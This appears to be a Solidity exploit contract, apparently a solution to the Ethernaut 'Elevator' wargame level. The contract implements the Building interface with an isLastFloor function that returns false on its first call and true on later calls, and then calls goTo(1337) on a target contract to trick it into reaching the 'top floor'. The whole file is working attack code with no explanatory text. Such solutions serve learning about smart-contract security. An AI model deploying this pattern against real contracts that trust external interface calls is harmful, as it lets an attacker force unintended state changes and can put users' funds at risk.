// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}


contract Attack is Building{
    uint256 public constant FLOOR = 1337;
    uint8 n = 0;
    
    function isLastFloor(uint256) external returns (bool){

        if (n == 0) {
            n += 1;
            return false;
        } else {
            return true;
        }
        
    }
    function attack(address  addressToAttack) external payable{
        addressToAttack.call(abi.encodeWithSignature("goTo(uint256)", FLOOR));
    }

}
